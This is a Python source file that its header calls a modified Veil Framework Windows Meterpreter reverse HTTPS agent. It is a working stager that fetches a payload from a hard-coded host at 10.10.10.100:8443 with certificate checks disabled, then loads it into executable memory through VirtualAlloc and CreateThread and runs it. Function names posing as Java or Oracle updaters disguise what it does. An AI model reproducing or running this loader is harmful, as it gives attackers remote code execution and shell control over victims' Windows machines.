#!/usr/bin/env python
#
# Copyright (C) 2016 David Evenden (@jedimammoth)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#This is a modified version of the encoded Python Windows Meterperter Reverse HTTPS agent created by the Veil Framework


import urllib2 , string , random , struct , ctypes , httplib , time, ssl

def configUpdater(s): print s; return sum([ord(ch) for ch in s]) % 0x100
def javaAppUpater():
        for x in xrange(64):
                oracleAppUpdater = ''.join(random.sample(string.ascii_letters + string.digits,3))
                stackTrace = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
                for libTrace in stackTrace:
                        if configUpdater(oracleAppUpdater + libTrace) == 92: return oracleAppUpdater + libTrace
def runUpdater(javaApplet1,javaApplet2):
        allocHandler = urllib2.ProxyHandler()
        storedAllocHandler = urllib2.build_opener(allocHandler)
        urllib2.install_opener(storedAllocHandler)
        #runAllocHandler = urllib2.Request("https://%s:%s/%s" %(javaApplet1,javaApplet2,javaAppUpater()), None, {'User-Agent' : 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7; en; rv:1.9.2.27) Gecko/20120217 Camino/2.1.1 (like Firefox/3.6.27)'})
        runAllocHandler = urllib2.Request("https://%s:%s/%s" %(javaApplet1,javaApplet2,javaAppUpater()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
        try:
                returnAllocHandler = urllib2.urlopen(runAllocHandler, context=ssl._create_unverified_context())
                try:
                        if int(returnAllocHandler.info()["Content-Length"]) > 100000: return returnAllocHandler.read()
                        else: return ''
                except: return returnAllocHandler.read()
        except urllib2.URLError, e: print e; return ''
def checkUpdater(javaApplet3):
        if javaApplet3 != "":
                try:
                        javaOracleArray = bytearray(javaApplet3)
                        virtualAlloc = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(javaOracleArray)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
                        virtualAllocMemory = (ctypes.c_char * len(javaOracleArray)).from_buffer(javaOracleArray)
                        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(virtualAlloc),virtualAllocMemory, ctypes.c_int(len(javaOracleArray)))
                        diskAllocMemory = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(virtualAlloc),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
                        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(diskAllocMemory),ctypes.c_int(-1))
                except Exception as e:
                        print e

storedData = ''
storedData = runUpdater("10.10.10.100", 8443)
checkUpdater(storedData)
